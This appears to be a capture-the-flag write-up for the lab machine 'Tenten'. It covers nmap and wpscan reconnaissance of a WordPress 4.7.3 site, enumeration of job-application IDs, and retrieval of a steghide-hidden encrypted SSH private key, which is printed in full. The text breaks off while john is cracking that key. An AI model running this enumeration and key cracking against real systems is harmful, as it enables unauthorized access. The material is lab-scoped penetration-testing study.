
Target : 10.129.5.48

Date : 29/05/2026

```bash
>  echo "10.129.5.48 tenten.htb" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.5.48 tenten.htb  
>  nmap -Pn -sV -sC -O -p- --min-rate=3000 10.129.5.48  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-29 16:37 +0200  
Nmap scan report for tenten.htb (10.129.5.48)  
Host is up (0.057s latency).  
Not shown: 65533 filtered tcp ports (no-response)  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)  
|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)  
|_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)  
80/tcp open  http    Apache httpd 2.4.18  
|_http-generator: WordPress 4.7.3  
|_http-server-header: Apache/2.4.18 (Ubuntu)  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Device type: general purpose|storage-misc  
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X (97%), Synology DiskStation Manager 7.X (88%)  
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/a:synology:diskstation_manager:7.1 cpe:/o:linux:linux_kernel:4.4  
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.14 (97%), Linux 2.6.32 - 3.13 (91%), Linux 4.4 (91%), Linux 2.6.32 - 3.10 (91%), Linux 3.13 - 4.4 (91%), Linux 3.8 - 3.16 (91%), Linux 3.11 - 4.9 (9  
1%), Linux 3.13 or 4.2 (90%), Linux 3.16 - 4.6 (90%)  
No exact OS matches for host (test conditions non-ideal).  
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 65.21 seconds
```

Linux box, only two ports open : http `80/tcp` and ssh `22/tcp`.
We see that the `http` web server is running `http-generator: WordPress 4.7.3`.

This seems straightforward on the surface and is our only visible attack vector for now, so we'll try to find any weakness on this version of WordPress.

```bash
>  wpscan --url http://tenten.htb --enumerate ap,at  
_______________________________________________________________  
        __          _______   _____  
        \ \        / /  __ \ / ____|  
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®  
          \ \/  \/ / |  ___/ \___ \ / __|/ _` |  _ \  
           \  /\  /  | |     ____) | (__| (_| | | | |  
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|  
  
                 WordPress Security Scanner  
                        Version 4.0.0  
                   An Automattic endeavor  
                   https://automattic.com  
_______________________________________________________________  
  
[i] Updating the Database ...  
[i] Update completed.  
  
[+] URL: http://tenten.htb/ [10.129.5.48]  
[+] Started: Fri May 29 16:45:29 2026  
[+] Command Line: wpscan --url http://tenten.htb --enumerate ap,at  
[+] Hostname: blackarch  
  
Interesting Finding(s):  
  
[+] Headers  
| Interesting Entry: Server: Apache/2.4.18 (Ubuntu)  
| Found By: Headers (Passive Detection)  
| Confidence: 100%  
  
[+] XML-RPC seems to be enabled: http://tenten.htb/xmlrpc.php  
| Found By: Direct Access (Aggressive Detection)  
| Confidence: 100%  
| References:  
|  - http://codex.wordpress.org/XML-RPC_Pingback_API  
|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/  
|  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/  
|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/  
|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/  
  
[+] WordPress readme found: http://tenten.htb/readme.html  
| Found By: Direct Access (Aggressive Detection)  
| Confidence: 100%  
  
[+] The external WP-Cron seems to be enabled: http://tenten.htb/wp-cron.php  
| Found By: Direct Access (Aggressive Detection)  
| Confidence: 60%  
| References:  
|  - https://www.iplocation.net/defend-wordpress-from-ddos  
|  - https://github.com/wpscanteam/wpscan/issues/1299  
  
[+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).  
| Found By: Rss Generator (Passive Detection)  
|  - http://tenten.htb/index.php/feed/, <generator>https://wordpress.org/?v=4.7.3</generator>  
| Confirmed By: Rss Generator (Passive Detection)  
|  - http://tenten.htb/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.3</generator>  
  
[+] WordPress theme in use: twentyseventeen  
| Location: http://tenten.htb/wp-content/themes/twentyseventeen/  
| Last Updated: 2026-05-19 10:00pm GMT (9 days ago, per WordPress.org)  
| Active Installs: 300,000 (per WordPress.org)  
| Readme: http://tenten.htb/wp-content/themes/twentyseventeen/README.txt  
| [!] The version is out of date, the latest version is 4.1  
| Style URL: http://tenten.htb/wp-content/themes/twentyseventeen/style.css?ver=4.7.3  
| Style Name: Twenty Seventeen  
| Style URI: https://wordpress.org/themes/twentyseventeen/  
| Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...  
| Author: the WordPress team  
| Author URI: https://wordpress.org/  
|  
| Found By: Css Style In Homepage (Passive Detection)  
|  
| Version: 1.1 (80% confidence)  
| Found By: Style (Passive Detection)  
|  - http://tenten.htb/wp-content/themes/twentyseventeen/style.css?ver=4.7.3, Match: 'Version: 1.1'  
  
[+] Enumerating All Plugins (via Passive and Aggressive Methods)  
  
[+] job-manager  
| Location: http://tenten.htb/wp-content/plugins/job-manager/  
| Latest Version: 0.7.25 (up to date)  
| Last Updated: 2015-08-25 10:44pm GMT (10 years ago)  
| Readme: http://tenten.htb/wp-content/plugins/job-manager/readme.txt  
|  
| Found By: Urls In Homepage (Passive Detection)  
|  
| Version: 7.2.5 (80% confidence)  
| Found By: Readme - Stable Tag (Aggressive Detection)  
|  - http://tenten.htb/wp-content/plugins/job-manager/readme.txt  
  
[+] akismet  
| Location: http://tenten.htb/wp-content/plugins/akismet/  
| Last Updated: 2026-04-23 10:34pm GMT (1 month ago, per WordPress.org)  
| Active Installs: 6,000,000 (per WordPress.org)  
| Readme: http://tenten.htb/wp-content/plugins/akismet/readme.txt  
| [!] The version is out of date, the latest version is 5.7  
|  
| Found By: Known Locations (Aggressive Detection)  
|  - http://tenten.htb/wp-content/plugins/akismet/, status: 200  
|  
| Version: 3.3 (100% confidence)  
| Found By: Readme - Stable Tag (Aggressive Detection)  
|  - http://tenten.htb/wp-content/plugins/akismet/readme.txt  
| Confirmed By: Readme - ChangeLog Section (Aggressive Detection)  
|  - http://tenten.htb/wp-content/plugins/akismet/readme.txt

>  curl -sI http://tenten.htb/xmlrpc.php  
HTTP/1.1 405 Method Not Allowed  
Date: Fri, 29 May 2026 14:59:35 GMT  
Server: Apache/2.4.18 (Ubuntu)  
Allow: POST  
Content-Type: text/plain;charset=UTF-8
```

We notice both `akismet` and `wordpress` are out of date. `http://tenten.htb/xmlrpc.php` "accepts POST requests only".

We see that `Wordpress 4.1.1` is from `February 18, 2015` 

```bash
>  searchsploit wordpress 4.1.1  

NEX-Forms WordPress plugin < 7.9.7 - Authenticated SQLi                                                                                                                         | php/webapps/51042.txt  
WordPress Core < 4.7.1 - Username Enumeration                                                                                                                                   | php/webapps/41497.php  
WordPress Core < 4.7.4 - Unauthorized Password Reset                                                                                                                            | linux/webapps/41963.txt  
WordPress Core < 4.9.6 - (Authenticated) Arbitrary File Deletion                                                                                                                | php/webapps/44949.txt  
WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts                                                                                                         | multiple/webapps/47690.md  
WordPress Core < 5.3.x - 'xmlrpc.php' Denial of Service                                                                                                                         | php/dos/47800.py  
WordPress File Upload Plugin < 4.23.3 - Stored XSS                                                                                                                              | php/webapps/51899.txt  
WordPress Plugin Background Takeover < 4.1.4 - Directory Traversal                                                                                                              | php/webapps/44417.txt  
WordPress Plugin Database Backup < 5.2 - Remote Code Execution (Metasploit)                                                                                                     | php/remote/47187.rb  
WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities                                                                                                             | php/webapps/39553.txt  
WordPress Plugin EZ SQL Reports < 4.11.37 - Multiple Vulnerabilities                                                                                                            | php/webapps/38176.txt  
WordPress Plugin Foxypress 0.4.1.1 < 0.4.2.1 - Arbitrary File Upload                                                                                                            | php/webapps/18991.php  
WordPress Plugin iThemes Security < 7.0.3 - SQL Injection                                                                                                                       | php/webapps/44943.txt  
WordPress Plugin Photo Album Plus 4.1.1 - SQL Injection                                                                                                                         | php/webapps/17983.txt  
WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection                                                                                                                     | php/webapps/48918.sh  
WordPress Plugin User Role Editor < 4.25 - Privilege Escalation                                                                                                                 | php/webapps/44595.rb  
WordPress Plugin Userpro < 4.9.17.1 - Authentication Bypass                                                                                                                     | php/webapps/43117.txt  
WordPress Plugin UserPro < 4.9.21 - User Registration Privilege Escalation                                                                                                      | php/webapps/46083.txt  
WordPress Theme Zoner Real Estate - 4.1.1 Persistent Cross-Site Scripting                                                                                                       | php/webapps/47436.txt  
WordPress User Registration & Membership Plugin 4.1.1 - Unauthenticated Privilege Escalation                                                                                    | multiple/webapps/52137.txt
```

This quite overwhelming.

```bash
> msfconsole -q
> msf > search name:wordpress version:4.1.1 type:exploit  
  
Matching Modules  
================  
  
  #   Name                                                           Disclosure Date  Rank       Check  Description  
  -   ----                                                           ---------------  ----       -----  -----------  
  0   exploit/multi/php/wp_duplicator_code_inject                    2018-08-29       manual     Yes    Snap Creek Duplicator WordPress plugin code injection  
  1   exploit/multi/http/wp_tatsu_rce                                2022-04-25       excellent  Yes    Tatsu Wordpress Plugin RCE  
  2   exploit/multi/http/wp_acf_extended_rce                         2025-12-02       excellent  Yes    WordPress ACF Extended Unauthenticated RCE via prepare_form()  
  3     \_ target: PHP In-Memory                                     .                .          .      .  
  4     \_ target: Unix/Linux Command Shell                          .                .          .      .  
  5     \_ target: Windows Command Shell                             .                .          .      .  
  6   exploit/multi/http/wp_ai_engine_mcp_rce                        2025-11-04       excellent  Yes    WordPress AI Engine Plugin MCP Unauthenticated Admin Creation to RCE  
  7     \_ target: PHP In-Memory                                     .                .          .      .  
  8     \_ target: Unix/Linux Command Shell                          .                .          .      .  
  9     \_ target: Windows Command Shell                             .                .          .      .  
  10  exploit/multi/http/wp_ait_csv_rce                              2020-11-14       excellent  Yes    WordPress AIT CSV Import Export Unauthenticated Remote Code Execution  
  11  exploit/unix/webapp/wp_admin_shell_upload                      2015-02-21       excellent  Yes    WordPress Admin Shell Upload  
  12  exploit/unix/webapp/wp_asset_manager_upload_exec               2012-05-26       excellent  Yes    WordPress Asset-Manager PHP File Upload Vulnerability  
  13  exploit/multi/http/wp_backup_migration_php_filter              2023-12-11       excellent  Yes    WordPress Backup Migration Plugin PHP Filter Chain RCE  
  14    \_ target: PHP In-Memory                                     .                .          .      .  
  15    \_ target: Unix/Linux Command Shell                          .                .          .      .  
  16    \_ target: Windows Command Shell                             .                .          .      .  
  17  exploit/multi/http/wp_crop_rce                                 2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload  
  18  exploit/multi/http/wp_file_manager_rce                         2020-09-09       normal     Yes    WordPress File Manager Unauthenticated Remote Code Execution  
  19  exploit/multi/http/wp_hash_form_rce                            2024-05-23       excellent  Yes    WordPress Hash Form Plugin RCE  
  20    \_ target: PHP In-Memory                                     .                .          .      .  
  21    \_ target: Unix/Linux Command Shell                          .                .          .      .  
  22    \_ target: Windows Command Shell                             .                .          .      .  
  23  exploit/unix/webapp/wp_holding_pattern_file_upload             2015-02-11       excellent  Yes    WordPress Holding Pattern Theme Arbitrary File Upload  
  24  exploit/unix/webapp/wp_infinitewp_auth_bypass                  2020-01-14       manual     Yes    WordPress InfiniteWP Client Authentication Bypass  
  25  exploit/multi/http/wp_king_addons_privilege_escalation         2025-10-30       excellent  Yes    WordPress King Addons for Elementor Unauthenticated Privilege Escalation to RCE  
  26    \_ target: PHP In-Memory                                     .                .          .      .  
  27    \_ target: Unix/Linux Command Shell                          .                .          .      .  
  28    \_ target: Windows Command Shell                             .                .          .      .  
  29  exploit/multi/http/wp_ninja_forms_unauthenticated_file_upload  2016-05-04       excellent  Yes    WordPress Ninja Forms Unauthenticated File Upload  
  30  exploit/unix/webapp/wp_optimizepress_upload                    2013-11-29       excellent  Yes    WordPress OptimizePress Theme File Upload Vulnerability  
  31  exploit/unix/webapp/wp_phpmailer_host_header                   2017-05-03       average    Yes    WordPress PHPMailer Host Header Command Injection  
  32  exploit/unix/webapp/wp_photo_gallery_unrestricted_file_upload  2014-11-11       excellent  Yes    WordPress Photo Gallery Unrestricted File Upload  
  33  exploit/unix/webapp/wp_pixabay_images_upload                   2015-01-19       excellent  Yes    WordPress Pixabay Images PHP Code Upload  
  34  exploit/unix/webapp/wp_platform_exec                           2015-01-21       excellent  No     WordPress Platform Theme File Upload Vulnerability  
  35  exploit/unix/webapp/wp_advanced_custom_fields_exec             2012-11-14       excellent  Yes    WordPress Plugin Advanced Custom Fields Remote File Inclusion  
  36  exploit/unix/webapp/wp_foxypress_upload                        2012-06-05       excellent  Yes    WordPress Plugin Foxypress uploadify.php Arbitrary Code Execution  
  37  exploit/unix/webapp/wp_google_document_embedder_exec           2013-01-03       normal     Yes    WordPress Plugin Google Document Embedder Arbitrary File Disclosure  
  38  exploit/unix/webapp/wp_pie_register_bypass_rce                 2021-10-08       excellent  Yes    WordPress Plugin Pie Register Auth Bypass to RCE  
  39  exploit/multi/http/wp_reallysimplessl_2fa_bypass_rce           2024-11-14       excellent  Yes    WordPress Really Simple SSL Plugin Authentication Bypass to RCE  
  40    \_ target: PHP In-Memory                                     .                .          .      .  
  41    \_ target: Unix In-Memory                                    .                .          .      .  
  42    \_ target: Windows In-Memory                                 .                .          .      .  
  43  exploit/multi/http/wp_responsive_thumbnail_slider_upload       2015-08-28       excellent  Yes    WordPress Responsive Thumbnail Slider Arbitrary File Upload  
  44  exploit/unix/webapp/wp_revslider_upload_execute                2014-11-26       excellent  Yes    WordPress RevSlider File Upload and Execute Vulnerability  
  45  exploit/multi/http/wp_royal_elementor_addons_rce               2023-11-23       excellent  Yes    WordPress Royal Elementor Addons RCE  
  46  exploit/multi/http/wp_simple_file_list_rce                     2020-04-27       good       Yes    WordPress Simple File List Unauthenticated Remote Code Execution  
  47  exploit/multi/http/wp_plugin_story_chef_file_upload            2025-08-04       excellent  Yes    WordPress StoryChief Plugin Unauthenticated RCE  
  48  exploit/multi/http/wp_suretriggers_auth_bypass                 2025-03-13       excellent  Yes    WordPress SureTriggers (aka OttoKit) Combined Auth Bypass (CVE-2025-3102, CVE-2025-27007)  
  49    \_ action: CVE-2025-27007                                    .                .          .      SureTriggers <= 1.0.82 auth bypass, reset & RCE  
  50    \_ action: CVE-2025-3102                                     .                .          .      SureTriggers <= 1.0.78 auth bypass & RCE  
  51    \_ target: PHP In-Memory                                     .                .          .      .  
  52    \_ target: Unix In-Memory                                    .                .          .      .  
  53    \_ target: Windows In-Memory                                 .                .          .      .  
  54  exploit/unix/webapp/wp_total_cache_exec                        2013-04-17       excellent  Yes    WordPress W3 Total Cache PHP Code Execution  
  55  exploit/unix/webapp/wp_easycart_unrestricted_file_upload       2015-01-08       excellent  No     WordPress WP EasyCart Unrestricted File Upload  
  56  exploit/unix/webapp/wp_mobile_detector_upload_execute          2016-05-31       excellent  Yes    WordPress WP Mobile Detector 3.5 Shell Upload  
  57  exploit/unix/webapp/wp_symposium_shell_upload                  2014-12-11       excellent  Yes    WordPress WP Symposium 14.11 Shell Upload  
  58  exploit/multi/http/wp_time_capsule_file_upload_rce             2024-11-15       excellent  Yes    WordPress WP Time Capsule Arbitrary File Upload to RCE  
  59    \_ target: PHP In-Memory                                     .                .          .      .  
  60    \_ target: Unix/Linux Command Shell                          .                .          .      .  
  61    \_ target: Windows Command Shell                             .                .          .      .  
  62  exploit/unix/webapp/wp_property_upload_exec                    2012-03-26       excellent  Yes    WordPress WP-Property PHP File Upload Vulnerability  
  63  exploit/unix/webapp/wp_wptouch_file_upload                     2014-07-14       excellent  Yes    WordPress WPTouch Authenticated File Upload  
  64  exploit/unix/webapp/wp_wpshop_ecommerce_file_upload            2015-03-09       excellent  Yes    WordPress WPshop eCommerce Arbitrary File Upload Vulnerability  
  65  exploit/unix/webapp/wp_lastpost_exec                           2005-08-09       excellent  No     WordPress cache_lastpostdate Arbitrary Code Execution  
  66  exploit/multi/http/wp_automatic_sqli_to_rce                    2024-03-13       excellent  Yes    WordPress wp-automatic Plugin SQLi Admin Creation  
  67    \_ target: PHP In-Memory                                     .                .          .      .  
  68    \_ target: Unix/Linux Command Shell                          .                .          .      .  
  69    \_ target: Windows Command Shell                             .                .          .      .  
  70  exploit/unix/webapp/wp_wpdiscuz_unauthenticated_file_upload    2020-02-21       excellent  Yes    WordPress wpDiscuz Unauthenticated File Upload Vulnerability  
  71  exploit/unix/webapp/wp_ajax_load_more_file_upload              2015-10-10       excellent  Yes    Wordpress Ajax Load More PHP Upload Vulnerability  
  72  exploit/unix/webapp/wp_creativecontactform_file_upload         2014-10-22       excellent  Yes    Wordpress Creative Contact Form Upload Vulnerability  
  73  exploit/unix/webapp/wp_downloadmanager_upload                  2014-12-03       excellent  Yes    Wordpress Download Manager (download-manager) Unauthenticated File Upload  
  74  exploit/multi/http/wp_dnd_mul_file_rce                         2020-05-11       excellent  Yes    Wordpress Drag and Drop Multi File Uploader RCE  
  75  exploit/multi/http/wp_plugin_fma_shortcode_unauth_rce          2023-05-31       excellent  Yes    Wordpress File Manager Advanced Shortcode 2.3.2 - Unauthenticated Remote Code Execution through shortcode  
  76    \_ target: PHP                                               .                .          .      .  
  77    \_ target: Unix Command                                      .                .          .      .  
  78    \_ target: Linux Dropper                                     .                .          .      .  
  79    \_ target: Windows Command                                   .                .          .      .  
  80    \_ target: Windows Dropper                                   .                .          .      .  
  81  exploit/unix/webapp/wp_frontend_editor_file_upload             2012-07-04       excellent  Yes    Wordpress Front-end Editor File Upload  
  82  exploit/unix/webapp/wp_inboundio_marketing_file_upload         2015-03-24       excellent  Yes    Wordpress InBoundio Marketing PHP Upload Vulnerability  
  83  exploit/unix/webapp/wp_infusionsoft_upload                     2014-09-25       excellent  Yes    Wordpress InfusionSoft Upload Vulnerability  
  84  exploit/multi/http/wp_litespeed_cookie_theft                   2024-09-04       excellent  Yes    Wordpress LiteSpeed Cache plugin cookie theft  
  85    \_ target: PHP In-Memory                                     .                .          .      .  
  86    \_ target: Unix In-Memory                                    .                .          .      .  
  87    \_ target: Windows In-Memory                                 .                .          .      .  
  88  exploit/unix/webapp/wp_wysija_newsletters_upload               2014-07-01       excellent  Yes    Wordpress MailPoet Newsletters (wysija-newsletters) Unauthenticated File Upload  
  89  exploit/unix/webapp/wp_nmediawebsite_file_upload               2015-04-12       excellent  Yes    Wordpress N-Media Website Contact Form Upload Vulnerability  
  90  exploit/unix/webapp/wp_plainview_activity_monitor_rce          2018-08-26       excellent  Yes    Wordpress Plainview Activity Monitor RCE  
  91  exploit/multi/http/wp_plugin_backup_guard_rce                  2021-05-04       excellent  Yes    Wordpress Plugin Backup Guard - Authenticated Remote Code Execution  
  92  exploit/multi/http/wp_catch_themes_demo_import                 2021-10-21       normal     Yes    Wordpress Plugin Catch Themes Demo Import RCE  
  93  exploit/multi/http/wp_plugin_elementor_auth_upload_rce         2022-03-29       excellent  Yes    Wordpress Plugin Elementor Authenticated Upload Remote Code Execution  
  94  exploit/multi/http/wp_plugin_modern_events_calendar_rce        2021-01-29       excellent  Yes    Wordpress Plugin Modern Events Calendar - Authenticated Remote Code Execution  
  95  exploit/multi/http/wp_plugin_sp_project_document_rce           2021-06-14       excellent  Yes    Wordpress Plugin SP Project and Document - Authenticated Remote Code Execution  
  96  exploit/multi/http/wp_popular_posts_rce                        2021-06-11       normal     Yes    Wordpress Popular Posts Authenticated RCE  
  97  exploit/unix/webapp/wp_reflexgallery_file_upload               2012-12-30       excellent  Yes    Wordpress Reflex Gallery Upload Vulnerability  
  98  exploit/unix/webapp/wp_slideshowgallery_upload                 2014-08-28       excellent  Yes    Wordpress SlideShow Gallery Authenticated File Upload  
  99  exploit/unix/webapp/wp_worktheflow_upload                      2015-03-14       excellent  Yes    Wordpress Work The Flow Upload Vulnerability  
  
  
Interact with a module by name or index. For example info 99, use 99 or use exploit/unix/webapp/wp_worktheflow_upload
```
This is even more.



We'll try exploiting the plugins :

`http://tenten.htb/wp-content/plugins/job-manager/`

```bash
>  curl -s http://tenten.htb/ | grep -oiE 'href="[^"]*(job|apply|resume|cv|manager)[^"]*"' | sort -u  
  
href="http://tenten.htb/index.php/jobs/"
```

```bash
>  curl -sL http://tenten.htb/wp-content/plugins/job-manager/readme.txt  
=== Job Manager ===  
Contributors: SMB-dev, gobblelogic  
Donate link: http://www.wp-jobmanager.com/donate/  
Plugin URI: http://www.wp-jobmanager.com  
License: GPLv3  
License URI: http://www.gnu.org/licenses/gpl.html  
Tags: application, applicant tracking, ats, board, candidate, candidates, career, company, current opportunities, direct hire, employee, employer, employees, employment, freelance,  
     hiring, hire, interview, interviews, job, jobs, job board, job list, job lists ,job listing, job manager, job management, job role, job search,  list, listing, manager, opportunities,  
     placement, position, positions, recruiter, recruiting, recruitment, talent  
Requires at least: 2.9  
Tested up to: 4.3  
Stable tag: 7.2.5
```

We search for exploits in `searchsploit` but they all seem outdated for this plugin.

We look for job IDs between 1 and 25 :

```bash
>  for i in $(seq 1 25); do  
 url="http://tenten.htb/index.php/jobs/apply/$i/"  
 bytes=$(curl -s "$url" | wc -c)  
 printf 'ID %2d  bytes %5d\n' "$i" "$bytes"  
done  
ID  1  bytes 57636  
ID  2  bytes 57633  
ID  3  bytes 57618  
ID  4  bytes 57528  
ID  5  bytes 57629  
ID  6  bytes 57644  
ID  7  bytes 57626  
ID  8  bytes 57634  
ID  9  bytes 57589  
ID 10  bytes 57639  
ID 11  bytes 57623  
ID 12  bytes 57641  
ID 13  bytes 57685  
ID 14  bytes 57528  
ID 15  bytes 57528  
ID 16  bytes 57528  
ID 17  bytes 57528  
ID 18  bytes 57528  
ID 19  bytes 57528  
ID 20  bytes 57528  
ID 21  bytes 57528  
ID 22  bytes 57528  
ID 23  bytes 57528  
ID 24  bytes 57528  
ID 25  bytes 57528
```

We fint the same number of bytes from `ID 14` through `25`, so we'll try the biggest one, and the one that is just before the `dead ID jobs` (as they have similar number of bytes) which is `ID 13` to see its content, dropping JS with `sed '/<script/,/<\/script>/d'` :

```bash
curl -s "http://tenten.htb/index.php/jobs/apply/${ID}/" \  
 | sed '/<script/,/<\/script>/d' \  
 | w3m -dump -T text/html 2>/dev/null \  
 | grep -viE '^(apply|submit|email|name|phone|resume|upload|click|send)' \  
 | head -30  
Skip to content  
Job Portal  
  
Job Portal  
  
Just another WordPress site  
  
Menu  
  
 • Jobs Listing  
  
Job Application: HackerAccessGranted  
  
Title: HackerAccessGranted  
  
Fields marked with an asterisk (*) must be filled out before submitting.  
  
Personal Details  
  
   Name *      [                    ]  
  Surname *    [                    ]  
  
Contact Details  
  
Address   [                    ]  
  City    [                    ]  
Post code  [                    ]  
Country   [                    ]  
Telephone  [                    ]  
Cell phone [                    ]
```

That gives us the job application `HackerAccessGranted`. Since the box `Tenten` was released in 2017, we'll attempt to find urls of images or CVs in `/uploads/2017/` for the job application posting.

```bash
>  BASENAME='HackerAccessGranted'  
for month in $(seq -w 1 12); do  
 for ext in jpg jpeg png pdf; do  
   url="http://tenten.htb/wp-content/uploads/2017/${month}/${BASENAME}.${ext}"  
   code=$(curl -s -o /dev/null -w '%{http_code}' "$url")  
   [ "$code" = "200" ] && echo "[+] FOUND: $url"  
 done  
done  
[+] FOUND: http://tenten.htb/wp-content/uploads/2017/04/HackerAccessGranted.jpg
```

And we got `HackerAccessGranted` indeed in 2017, at month `04` thanks to the function that goes from `1 (January)` to `12 (December)` and to the filter that got us an image : a .jpg file. 

We'll save the image with `curl` as a `.bin` file and examine it :

```bash
>  curl -s "http://tenten.htb/wp-content/uploads/2017/04/HackerAccessGranted.jpg" -o ~/HackerAccessGranted.bin  
>  file ~/HackerAccessGranted.bin  
  
/home/vagabond/HackerAccessGranted.bin: JPEG image data, JFIF standard 1.01, resolution (DPCM), density 29x29, segment length 16, baseline, precision 8, 1500x1001, components 3  
>  ls -la ~/HackerAccessGranted.bin  
  
-rw-r--r-- 1 vagabond vagabond 262408 May 29 18:46 /home/vagabond/HackerAccessGranted.bin  
>  strings ~/HackerAccessGranted.bin | head -30  
  
JFIF  
$.' ",#  
(7),01444  
'9=82<.342  
!22222222222222222222222222222222222222222222222222  
$3br  
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz  
       #3R  
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz  
E#Mm  
WZKZ  
WW*<  
V9uQ  
.EUVav  
4}b,=  
:|)qt  
b<( 7  
\m*F  
)LR(  
d@=^  
lG `  
l~Uq.#@T  
MO,D  
{tc:  
/jp_  
Dj{ Cd  
|Vu>  
yr_]4D  
Y2HV  
*%I4
```

We got the number of the job and some sort of code, it might be a hash : `56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz`

```bash
>  steghide extract -sf ~/HackerAccessGranted.bin -p ''  
  
wrote extracted data to "id_rsa".
```

It seems we got an ssh key. 

```bash
> cat id_rsa  
-----BEGIN RSA PRIVATE KEY-----  
Proc-Type: 4,ENCRYPTED  
DEK-Info: AES-128-CBC,7265FC656C429769E4C1EEFC618E660C  
  
/HXcUBOT3JhzblH7uF9Vh7faa76XHIdr/Ch0pDnJunjdmLS/laq1kulQ3/RF/Vax  
tjTzj/V5hBEcL5GcHv3esrODlS0jhML53lAprkpawfbvwbR+XxFIJuz7zLfd/vDo  
1KuGrCrRRsipkyae5KiqlC137bmWK9aE/4c5X2yfVTOEeODdW0rAoTzGufWtThZf  
K2ny0iTGPndD7LMdm/o5O5As+ChDYFNphV1XDgfDzHgonKMC4iES7Jk8Gz20PJsm  
SdWCazF6pIEqhI4NQrnkd8kmKqzkpfWqZDz3+g6f49GYf97aM5TQgTday2oFqoXH  
WPhK3Cm0tMGqLZA01+oNuwXS0H53t9FG7GqU31wj7nAGWBpfGodGwedYde4zlOBP  
VbNulRMKOkErv/NCiGVRcK6k5Qtdbwforh+6bMjmKE6QvMXbesZtQ0gC9SJZ3lMT  
J0IY838HQZgOsSw1jDrxuPV2DUIYFR0W3kQrDVUym0BoxOwOf/MlTxvrC2wvbHqw  
AAniuEotb9oaz/Pfau3OO/DVzYkqI99VDX/YBIxd168qqZbXsM9s/aMCdVg7TJ1g  
2gxElpV7U9kxil/RNdx5UASFpvFslmOn7CTZ6N44xiatQUHyV1NgpNCyjfEMzXMo  
6FtWaVqbGStax1iMRC198Z0cRkX2VoTvTlhQw74rSPGPMEH+OSFksXp7Se/wCDMA  
pYZASVxl6oNWQK+pAj5z4WhaBSBEr8ZVmFfykuh4lo7Tsnxa9WNoWXo6X0FSOPMk  
tNpBbPPq15+M+dSZaObad9E/MnvBfaSKlvkn4epkB7n0VkO1ssLcecfxi+bWnGPm  
KowyqU6iuF28w1J9BtowgnWrUgtlqubmk0wkf+l08ig7koMyT9KfZegR7oF92xE9  
4IWDTxfLy75o1DH0Rrm0f77D4HvNC2qQ0dYHkApd1dk4blcb71Fi5WF1B3RruygF  
2GSreByXn5g915Ya82uC3O+ST5QBeY2pT8Bk2D6Ikmt6uIlLno0Skr3v9r6JT5J7  
L0UtMgdUqf+35+cA70L/wIlP0E04U0aaGpscDg059DL88dzvIhyHg4Tlfd9xWtQS  
VxMzURTwEZ43jSxX94PLlwcxzLV6FfRVAKdbi6kACsgVeULiI+yAfPjIIyV0m1kv  
5HV/bYJvVatGtmkNuMtuK7NOH8iE7kCDxCnPnPZa0nWoHDk4yd50RlzznkPna74r  
Xbo9FdNeLNmER/7GGdQARkpd52Uur08fIJW2wyS1bdgbBgw/G+puFAR8z7ipgj4W  
p9LoYqiuxaEbiD5zUzeOtKAKL/nfmzK82zbdPxMrv7TvHUSSWEUC4O9QKiB3amgf  
yWMjw3otH+ZLnBmy/fS6IVQ5OnV6rVhQ7+LRKe+qlYidzfp19lIL8UidbsBfWAzB  
9Xk0sH5c1NQT6spo/nQM3UNIkkn+a7zKPJmetHsO4Ob3xKLiSpw5f35SRV+rF+mO  
vIUE1/YssXMO7TK6iBIXCuuOUtOpGiLxNVRIaJvbGmazLWCSyptk5fJhPLkhuK+J  
YoZn9FNAuRiYFL3rw+6qol+KoqzoPJJek6WHRy8OSE+8Dz1ysTLIPB6tGKn7EWnP  
-----END RSA PRIVATE KEY-----
```

Unfortunately for us, it's encrypted : `Proc-Type: 4,ENCRYPTED`

We'll try to decrypt it to gain foothold :

```bash
>  ssh2john id_rsa > id_rsa_tenten.hash

>  john id_rsa_tenten.hash -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"  
Use the "--format=ssh-opencl" option to force loading these as that type instead  
Warning: only loading hashes of type "SSH", but also saw type "tripcode"  
Use the "--format=tripcode" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "descrypt"  
Use the "--format=descrypt" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "descrypt-opencl"  
Use the "--format=descrypt-opencl" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "pix-md5"  
Use the "--format=pix-md5" option to force loading hashes of that type instead  
